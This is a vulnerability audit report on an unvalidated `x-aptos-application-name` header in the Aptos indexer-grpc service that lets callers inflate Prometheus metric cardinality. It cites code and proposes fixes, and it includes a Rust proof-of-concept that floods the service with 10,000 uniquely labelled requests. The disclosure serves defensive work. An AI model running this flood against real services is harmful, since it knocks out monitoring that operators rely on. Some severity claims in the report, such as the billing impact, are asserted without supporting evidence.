# Audit Report

## Title
Unbounded Metrics Cardinality Explosion via Malicious `x-aptos-application-name` Header Poisoning

## Summary
The indexer-grpc data service accepts arbitrary user-controlled values in the `x-aptos-application-name` HTTP header without validation, directly using them as Prometheus metric labels. This enables attackers to create unbounded metric cardinality, causing memory exhaustion, monitoring system failure, and complete loss of observability for the indexer infrastructure.

## Finding Description

The vulnerability exists in the request metadata extraction logic that processes gRPC headers for metrics and logging purposes. [1](#0-0) 

The `get_request_metadata()` function extracts the `x-aptos-application-name` header directly from incoming requests with zero validation on:
- String length (could be megabytes)
- Character set (could contain unicode, special characters, nulls)
- Uniqueness/cardinality (no deduplication or limits)
- Format validation (no pattern matching)

If the header is missing, it defaults to `"unspecified"`, but if present, any attacker-supplied value is accepted verbatim. This extracted value becomes part of `IndexerGrpcRequestMetadata.request_application_name` which is then used as a Prometheus metric label: [2](#0-1) 

These label values are used across **eight critical metrics** that track data service operations: [3](#0-2) [4](#0-3) [5](#0-4) 

**Attack Path:**
1. Attacker sends gRPC `GetTransactions` requests with unique `x-aptos-application-name` values
2. Each unique value creates new time series for 8+ metrics (LATEST_PROCESSED_VERSION_PER_PROCESSOR, PROCESSED_VERSIONS_COUNT_PER_PROCESSOR, BYTES_READY_TO_TRANSFER_FROM_SERVER, etc.)
3. With 5 labels per metric and 8 metrics, each unique application name creates 8 new time series
4. Sending 10,000 requests with unique names creates 80,000 new time series
5. Prometheus stores all time series in memory, causing memory exhaustion
6. Query performance degrades exponentially with cardinality
7. Monitoring dashboards become unusable or crash
8. Legitimate metrics are drowned out, making incident response impossible

The service configuration shows it listens on `0.0.0.0` (all network interfaces) without authentication: [6](#0-5) 

The comment on line 179 states "Add authentication interceptor" but no actual interceptor is implemented. The `whitelisted_auth_tokens` configuration field is marked as deprecated and unused. [7](#0-6) 

## Impact Explanation

This vulnerability qualifies as **Medium Severity** under the modified criteria for infrastructure services:

1. **Monitoring System Failure**: Unbounded cardinality causes Prometheus memory exhaustion and query timeouts, rendering the entire monitoring stack inoperable
2. **Loss of Observability**: Operators cannot detect incidents, track performance, or debug issues when metrics are poisoned
3. **Billing Manipulation**: The metrics are explicitly used for billing calculations, allowing attackers to inflate resource usage metrics or hide malicious activity
4. **Service Degradation**: High cardinality queries can slow down the entire metrics pipeline, affecting all dependent dashboards and alerting
5. **Incident Response Impairment**: During an actual attack or outage, poisoned metrics make it impossible to distinguish legitimate from malicious traffic

While this doesn't directly affect consensus or validator operations, the indexer-grpc infrastructure is critical for ecosystem health - applications, wallets, and explorers depend on it for blockchain data access. Complete monitoring failure during an incident could cascade into broader infrastructure problems.

## Likelihood Explanation

**Likelihood: HIGH**

The attack is trivial to execute:
- No authentication required on header values
- Service accepts connections from any network interface (`0.0.0.0`)
- Simple HTTP header manipulation in gRPC requests
- No rate limiting on metric cardinality
- Automated tools can generate thousands of unique names instantly

An attacker needs only:
1. A gRPC client (can use `grpcurl` or any gRPC library)
2. Network access to the service endpoint
3. A script to generate unique application names

The vulnerability is always exploitable and requires no special timing, race conditions, or insider knowledge.

## Recommendation

Implement multi-layered validation and protection:

**1. Input Validation (Immediate Fix):**
```rust
// In get_request_metadata() function
const MAX_APPLICATION_NAME_LENGTH: usize = 64;
const ALLOWED_APPLICATION_NAME_PATTERN: &str = r"^[a-zA-Z0-9_\-\.]+$";

pub fn get_request_metadata(req: &Request<GetTransactionsRequest>) -> IndexerGrpcRequestMetadata {
    // ... existing code ...
    
    let application_name = req.metadata()
        .get(REQUEST_HEADER_APTOS_APPLICATION_NAME)
        .and_then(|value| value.to_str().ok())
        .unwrap_or("unspecified");
    
    // Validate and sanitize
    let sanitized_name = if application_name.len() > MAX_APPLICATION_NAME_LENGTH {
        "invalid_too_long"
    } else if !Regex::new(ALLOWED_APPLICATION_NAME_PATTERN).unwrap().is_match(application_name) {
        "invalid_chars"
    } else {
        application_name
    };
    
    request_metadata_map.insert(
        "request_application_name".to_string(),
        sanitized_name.to_string(),
    );
    // ... rest of code ...
}
```

**2. Cardinality Limiting:**
```rust
// Add a bounded cache for known application names
use lru::LruCache;

static KNOWN_APPLICATION_NAMES: Lazy<Mutex<LruCache<String, ()>>> = Lazy::new(|| {
    Mutex::new(LruCache::new(NonZeroUsize::new(1000).unwrap()))
});

// Before using in metrics
fn get_validated_application_name(raw_name: &str) -> String {
    let mut cache = KNOWN_APPLICATION_NAMES.lock().unwrap();
    if cache.get(raw_name).is_some() {
        raw_name.to_string()
    } else if cache.len() < 1000 {
        cache.put(raw_name.to_string(), ());
        raw_name.to_string()
    } else {
        "cardinality_limit_exceeded".to_string()
    }
}
```

**3. API Gateway Enforcement:**
Since the comments reference an external API Gateway, implement header validation there as well before requests reach the indexer service. The gateway should maintain a whitelist of registered application IDs and reject unknown ones.

**4. Rate Limiting:**
Implement per-IP rate limiting on the gRPC service to prevent rapid metric poisoning attacks.

## Proof of Concept

```rust
// Save as metrics_poison_poc.rs
use tonic::Request;
use tonic::metadata::MetadataValue;
use aptos_protos::indexer::v1::{GetTransactionsRequest, raw_data_client::RawDataClient};

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let mut client = RawDataClient::connect("http://localhost:50051").await?;
    
    println!("[*] Starting metrics poisoning attack...");
    
    // Attack: Send requests with unique application names
    for i in 0..10000 {
        let unique_name = format!("malicious_app_{}", i);
        
        let mut request = Request::new(GetTransactionsRequest {
            starting_version: Some(0),
            transactions_count: Some(1),
            ..Default::default()
        });
        
        // Inject malicious application name header
        request.metadata_mut().insert(
            "x-aptos-application-name",
            MetadataValue::try_from(unique_name.as_str())?,
        );
        request.metadata_mut().insert(
            "x-aptos-identifier-type",
            MetadataValue::from_static("application"),
        );
        request.metadata_mut().insert(
            "x-aptos-identifier",
            MetadataValue::from_static("00000000-0000-0000-0000-000000000000"),
        );
        request.metadata_mut().insert(
            "x-aptos-email",
            MetadataValue::from_static("attacker@example.com"),
        );
        request.metadata_mut().insert(
            "x-aptos-request-name",
            MetadataValue::from_static("default"),
        );
        
        // Each request creates 8 new time series in Prometheus
        let response = client.get_transactions(request).await;
        
        if i % 100 == 0 {
            println!("[*] Poisoned {} metrics (created {} time series)", i, i * 8);
        }
    }
    
    println!("[*] Attack complete. Created 80,000+ time series.");
    println!("[*] Check Prometheus memory usage and query performance.");
    
    Ok(())
}
```

**Expected Outcome:**
1. Prometheus memory usage increases dramatically (hundreds of MB to GB)
2. Query `{__name__=~"indexer_grpc.*"}` shows 80,000+ time series
3. Grafana dashboards timeout or show incomplete data
4. Legitimate application metrics are impossible to query efficiently
5. Alerting based on these metrics fails

**Notes**

This vulnerability specifically affects the indexer-grpc infrastructure, which while not part of core consensus, is critical for ecosystem operations. The issue demonstrates a classic metrics cardinality explosion attack enabled by insufficient input validation on user-controlled data used in observability systems. The fix requires defense-in-depth: input validation, cardinality limits, and proper authentication/authorization on metric label values.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-utils/src/constants.rs (L60-68)
```rust
    pub fn get_label_values(&self) -> Vec<&str> {
        vec![
            &self.request_identifier_type,
            &self.request_identifier,
            &self.request_email,
            &self.request_application_name,
            &self.processor_name,
        ]
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-utils/src/constants.rs (L72-106)
```rust
pub fn get_request_metadata(req: &Request<GetTransactionsRequest>) -> IndexerGrpcRequestMetadata {
    let request_metadata_pairs = vec![
        (
            "request_identifier_type",
            REQUEST_HEADER_APTOS_IDENTIFIER_TYPE,
        ),
        ("request_identifier", REQUEST_HEADER_APTOS_IDENTIFIER),
        ("request_email", REQUEST_HEADER_APTOS_EMAIL),
        (
            "request_application_name",
            REQUEST_HEADER_APTOS_APPLICATION_NAME,
        ),
        ("request_token", GRPC_AUTH_TOKEN_HEADER),
        ("processor_name", GRPC_REQUEST_NAME_HEADER),
    ];
    let mut request_metadata_map: HashMap<String, String> = request_metadata_pairs
        .into_iter()
        .map(|(key, value)| {
            (
                key.to_string(),
                req.metadata()
                    .get(value)
                    .map(|value| value.to_str().unwrap_or("unspecified").to_string())
                    .unwrap_or("unspecified".to_string()),
            )
        })
        .collect();
    request_metadata_map.insert(
        "request_connection_id".to_string(),
        Uuid::new_v4().to_string(),
    );

    // TODO: update the request name if these are internal requests.
    serde_json::from_str(&serde_json::to_string(&request_metadata_map).unwrap()).unwrap()
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service/src/metrics.rs (L14-43)
```rust
pub static LATEST_PROCESSED_VERSION_PER_PROCESSOR: Lazy<IntGaugeVec> = Lazy::new(|| {
    register_int_gauge_vec!(
        "indexer_grpc_data_service_with_user_latest_processed_version",
        "Latest processed transaction version",
        &[
            "identifier_type",
            "identifier",
            "email",
            "application_name",
            "processor"
        ],
    )
    .unwrap()
});

/// Number of transactions that served by data service.
pub static PROCESSED_VERSIONS_COUNT_PER_PROCESSOR: Lazy<IntCounterVec> = Lazy::new(|| {
    register_int_counter_vec!(
        "indexer_grpc_data_service_with_user_processed_versions",
        "Number of transactions that have been processed by data service",
        &[
            "identifier_type",
            "identifier",
            "email",
            "application_name",
            "processor"
        ],
    )
    .unwrap()
});
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service/src/metrics.rs (L110-141)
```rust
pub static BYTES_READY_TO_TRANSFER_FROM_SERVER: Lazy<IntCounterVec> = Lazy::new(|| {
    register_int_counter_vec!(
        "indexer_grpc_data_service_bytes_ready_to_transfer_from_server",
        "Count of bytes ready to transfer to the client (pre stripping)",
        &[
            "identifier_type",
            "identifier",
            "email",
            "application_name",
            "processor"
        ],
    )
    .unwrap()
});

/// The number of transactions that had data (such as events, writesets, payload,
/// signature) stripped from them due to the `txns_to_strip_filter`. See
/// `strip_transactions` for more.
pub static NUM_TRANSACTIONS_STRIPPED: Lazy<IntCounterVec> = Lazy::new(|| {
    register_int_counter_vec!(
        "indexer_grpc_data_service_num_transactions_stripped",
        "Number of transactions that had data (such as events, writesets, payload, signature) stripped from them",
        &[
            "identifier_type",
            "identifier",
            "email",
            "application_name",
            "processor"
        ],
    )
    .unwrap()
});
```

**File:** ecosystem/indexer-grpc/indexer-grpc-utils/src/counters.rs (L227-241)
```rust
pub static BYTES_READY_TO_TRANSFER_FROM_SERVER_AFTER_STRIPPING: Lazy<IntCounterVec> =
    Lazy::new(|| {
        register_int_counter_vec!(
            "indexer_grpc_data_service_bytes_ready_to_transfer_from_server_after_stripping",
            "Count of bytes ready to transfer to the client (post stripping)",
            &[
                "identifier_type",
                "identifier",
                "email",
                "application_name",
                "processor"
            ],
        )
        .unwrap()
    });
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service/src/config.rs (L58-63)
```rust
    /// Deprecated: a list of auth tokens that are allowed to access the service.
    #[serde(default)]
    pub whitelisted_auth_tokens: Vec<String>,
    /// Deprecated: if set, don't check for auth tokens.
    #[serde(default)]
    pub disable_auth_check: bool,
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service/src/config.rs (L179-191)
```rust
        // Add authentication interceptor.
        let server = RawDataServerWrapper::new(
            self.redis_read_replica_address.clone(),
            self.file_store_config.clone(),
            self.data_service_response_channel_size,
            self.txns_to_strip_filter.clone(),
            cache_storage_format,
            Arc::new(in_memory_cache),
        )?;
        let svc = aptos_protos::indexer::v1::raw_data_server::RawDataServer::new(server)
            .send_compressed(CompressionEncoding::Zstd)
            .accept_compressed(CompressionEncoding::Zstd)
            .accept_compressed(CompressionEncoding::Gzip);
```
